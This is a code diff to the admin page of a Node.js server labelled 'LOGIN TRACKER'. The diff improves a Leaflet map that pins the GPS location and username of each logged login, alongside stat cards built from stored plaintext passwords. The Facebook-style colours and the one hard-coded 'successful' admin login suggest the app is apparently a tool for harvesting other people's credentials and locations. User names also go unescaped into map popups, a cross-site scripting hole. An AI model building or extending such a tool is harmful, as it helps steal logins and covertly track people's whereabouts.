@@ -94,7 +94,7 @@ const server = http.createServer((req, res) => {
         return;
     }
 
-    // Admin panel with map
+    // Admin panel with zoomable map (markers stay)
     if (req.url === '/admin') {
         let logsHtml = '';
         for (let log of loginLogs) {
@@ -114,6 +114,10 @@ const server = http.createServer((req, res) => {
             `;
         }
 
+        const locationsWithMarkers = loginLogs
+            .filter(l => l.location)
+            .map(l => ({ lat: l.location.lat, lon: l.location.lon, user: l.username }));
+
         res.writeHead(200, { 'Content-Type': 'text/html' });
         res.end(`
             <!DOCTYPE html>
@@ -127,19 +131,22 @@ const server = http.createServer((req, res) => {
                     .stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; margin: 20px 0; }
                     .stat-card { background: #1a1f3e; padding: 20px; border-radius: 10px; text-align: center; }
                     .stat-number { font-size: 48px; font-weight: bold; color: #00ff88; }
+                    .stat-label { font-size: 14px; color: #888; }
                     table { width: 100%; border-collapse: collapse; background: #1a1f3e; border-radius: 10px; overflow-x: auto; display: block; }
                     th, td { padding: 10px; text-align: left; border-bottom: 1px solid #2a2f4e; font-size: 12px; }
                     th { background: #1877f2; color: white; position: sticky; top: 0; }
-                    #map { height: 400px; margin: 20px 0; border-radius: 10px; }
+                    #map { height: 400px; margin: 20px 0; border-radius: 10px; z-index: 1; }
                     .refresh-btn { background: #1877f2; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; }
+                    .leaflet-control-attribution { font-size: 9px; }
                 </style>
             </head>
             <body>
                 <h1>📍 ADMIN PANEL - LOGIN TRACKER</h1>
                 <div class="stats">
-                    <div class="stat-card"><div class="stat-number">${loginLogs.length}</div><div>Total Logins</div></div>
-                    <div class="stat-card"><div class="stat-number">${loginLogs.filter(l => l.username === 'admin' && l.password === '123456').length}</div><div>Successful</div></div>
-                    <div class="stat-card"><div class="stat-number">${loginLogs.filter(l => l.location).length}</div><div>With GPS</div></div>
+                    <div class="stat-card"><div class="stat-number">${loginLogs.length}</div><div class="stat-label">Total Logins</div></div>
+                    <div class="stat-card"><div class="stat-number">${loginLogs.filter(l => l.username === 'admin' && l.password === '123456').length}</div><div class="stat-label">Successful</div></div>
+                    <div class="stat-card"><div class="stat-number">${loginLogs.filter(l => l.location).length}</div><div class="stat-label">With GPS</div></div>
+                    <div class="stat-card"><div class="stat-number">${loginLogs.filter(l => l.location).length}</div><div class="stat-label">📍 Markers</div></div>
                 </div>
                 <div id="map"></div>
                 <button class="refresh-btn" onclick="location.reload()">🔄 Refresh</button>
@@ -151,12 +158,29 @@ const server = http.createServer((req, res) => {
                 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"><\/script>
                 <script>
                     const map = L.map('map').setView([27.7, 85.3], 7);
-                    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
-                    const locations = ${JSON.stringify(loginLogs.filter(l => l.location).map(l => ({ lat: l.location.lat, lon: l.location.lon, user: l.username })))};
+                    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                        attribution: '&copy; OpenStreetMap contributors'
+                    }).addTo(map);
+
+                    const locations = ${JSON.stringify(locationsWithMarkers)};
+                    console.log('📍 Markers:', locations);
+
+                    // Add markers (they stay when zooming)
                     locations.forEach(loc => {
-                        L.marker([loc.lat, loc.lon]).addTo(map)
-                            .bindPopup('📍 ' + loc.user);
+                        if (loc.lat && loc.lon) {
+                            L.marker([loc.lat, loc.lon], { riseOnHover: true })
+                                .addTo(map)
+                                .bindPopup('<strong>📍 ' + loc.user + '</strong>');
+                        }
                     });
+
+                    // Fit map to show all markers if any exist
+                    if (locations.length > 0) {
+                        const group = L.featureGroup(
+                            locations.map(loc => L.marker([loc.lat, loc.lon]))
+                        );
+                        map.fitBounds(group.getBounds().pad(0.2));
+                    }
                 <\/script>
             </body>
             </html>
